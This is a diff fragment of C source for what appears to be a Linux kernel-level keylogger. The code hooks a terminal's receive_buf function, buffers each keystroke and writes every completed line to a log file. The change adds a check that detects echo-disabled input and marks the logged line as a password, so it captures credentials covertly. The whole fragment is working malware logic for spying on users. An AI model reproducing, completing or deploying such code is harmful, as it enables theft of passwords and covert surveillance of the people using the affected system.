@@ -57,10 +57,6 @@ void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
 void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
 		     char* fp, int count){
 
-  // we check if echoing is disabled. If it is,
-  // then it is probably a password prompt and we
-  // want to log it
-
   // ignore raw mode
   if(!tty->raw && !tty->real_raw){
     //if(L_ICANON(tty) && !L_ECHO(tty)) to check for passwd prompts
@@ -74,20 +70,24 @@ void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
 	  logger->pos--;
 	  logger->buf[logger->pos] = 0;
 	}
-	return;
-      }
-      // otherwise, add the char
-      append_char((char*)cp,sizeof(char));
+      }else{
+	// otherwise, add the char
+	append_char((char*)cp,1);
 
-      // check if the user pressed enter
-      if(cp[0] == 0x0D ||
-	 cp[0] == 0x0A){
-	// write our current log to our buffer
-	kwrite(logfile,0,logger->buf,logger->pos*sizeof(char));
-	// reset the logger
-	reset_logger();
+	// check if the user pressed enter
+	if(cp[0] == 0x0D ||
+	   cp[0] == 0x0A){
+	  // write our current log to our buffer
+	  kwrite(logfile,0,logger->buf,logger->pos);
+
+	  // if this is a password
+	  if(L_ICANON(tty) && !L_ECHO(tty)){
+	    kwrite(logfile,0,"--(the above is a password)--\n",30);
+	  }
+	  // reset the logger
+	  reset_logger();
+	}
       }
-      //if(logfile) kwrite(logfile,0,cp,count*sizeof(char));
     }
   }
   // call the old function
